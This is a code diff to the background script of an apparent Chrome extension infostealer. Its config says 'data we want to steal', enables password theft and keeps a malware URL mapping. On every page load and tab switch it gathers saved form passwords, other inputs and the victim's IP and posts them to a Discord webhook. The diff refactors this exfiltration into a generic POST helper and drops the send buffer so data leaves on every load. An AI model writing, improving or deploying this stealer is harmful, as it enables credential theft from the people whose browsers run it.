@@ -1,5 +1,9 @@
 // global variables relevant to webhook deployment
-const url = ""; // webhook url goes here
+
+// TODO: Convert to class, add .env for webhook urls
+const webhooks = {
+    DISCORD: "", // discord webhook url
+}
 
 // ENUMS
 const TAB_SWITCH = 0;
@@ -24,8 +28,7 @@ let malware_url_mapping = {
 const config = {
     allow_send_on_tab_switch: false, // turn on if you want to count tab switches towards your buff count.
     allow_send_on_tab_load: true, // turn on if you want to count tab loads towards your buff count
-    buffered_sending: true, // turn on if you want to send data only on x page loads
-    buffer_send_threshold: 5, // num complete page loads required for sending data
+    buffer_send_threshold: 1, // num complete page loads required for sending data (1 = no buffer)
 
     // data we want to steal
     steal_passwords: true,  // turn on if you want to steal passwords from sites.
@@ -34,23 +37,35 @@ const config = {
 
 // webhook related functions
 /**
+ * Sends post request to the specified url with the provided JSON data.
+ * @param {str} url
+ * @param json_data
+ */
+function post_data(url, json_data) {
+    // send post request to endpoint
+    fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(json_data, null, 2),
+    });
+}
+
+/**
  * A bare-bones method that allows you to send messages to your discord webhook.
  * @param {str} msg 
  */
-function send_webhook(msg) {
+function send_discord_webhook(msg) {
+    // TODO: Add support for embeds to make message display nicer
+    
     // webhook specific parameters
     const params = {
         username: ip,
         avatar_url: "",
-        content: msg,
+        content: `${"```"}${msg}${"```"}`,
     };
 
-    // sending as post request to the webhook url
-    fetch(url, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(params),
-    });
+    // send message to discord webhook
+    post_data(webhooks.DISCORD, params);
 }
 
 /**
@@ -59,17 +74,18 @@ function send_webhook(msg) {
  * @param {ENUM} dispatcher 
  */
 function dispatch_info_send(dispatcher, msg) {
-    let valid_dispatch = (dispatcher == TAB_SWITCH && config.allow_send_on_tab_switch) || (dispatcher == TAB_LOAD && config.allow_send_on_tab_load);
-    if (valid_dispatch) {
+    const valid_dispatch = (dispatcher == TAB_SWITCH && config.allow_send_on_tab_switch) || (dispatcher == TAB_LOAD && config.allow_send_on_tab_load);
+    if (valid_dispatch && config.buffer_send_threshold > 1) {
         buffer_count++;
-        console.log(buffer_count);
+        console.log(`[i] Current buffer count: ${buffer_count}`);
     }
 
-    if (valid_dispatch && !config.buffered_sending) {
-        // we've valid that the dispatcher is allowed to dispatch.
-        send_webhook(msg);
-    } else if ((valid_dispatch && config.buffered_sending) && (buffer_count % config.buffer_send_threshold == 0)) {
-        send_webhook(msg);
+    // TODO: Add mapping for sending other webhooks
+
+    // validate that dispatcher is allowed to execute
+    if (valid_dispatch && (buffer_count % config.buffer_send_threshold == 0)) {
+        console.log("[+] Buffer ready. Sending webhook...")
+        send_discord_webhook(msg);
     }
 }
 
@@ -86,7 +102,7 @@ function create_info_entry(url) {
     info[url] = {
         passwords: {},
         alt_inputs: {},
-        tol: new Date().toUTCString(),
+        timestamp: new Date().toUTCString(),
     }
 }
 
@@ -140,7 +156,7 @@ chrome.tabs.onActivated.addListener(
         if (info[lastActiveTab] === undefined) {
             create_info_entry(lastActiveTab);
         }
-        dispatch_info_send(TAB_SWITCH, JSON.stringify({ip: ip, data: info}));
+        dispatch_info_send(TAB_SWITCH, JSON.stringify({ ip: ip, data: info }, null, 2));
     }
 );
 
@@ -150,5 +166,5 @@ chrome.tabs.onActivated.addListener(
 chrome.webNavigation.onCompleted.addListener((details) => {
     lastActiveTab = details.url;
     create_info_entry(details.url);
-    dispatch_info_send(TAB_LOAD, JSON.stringify({ip: ip, data: info}));
+    dispatch_info_send(TAB_LOAD, JSON.stringify({ ip: ip, data: info }, null, 2));
 });
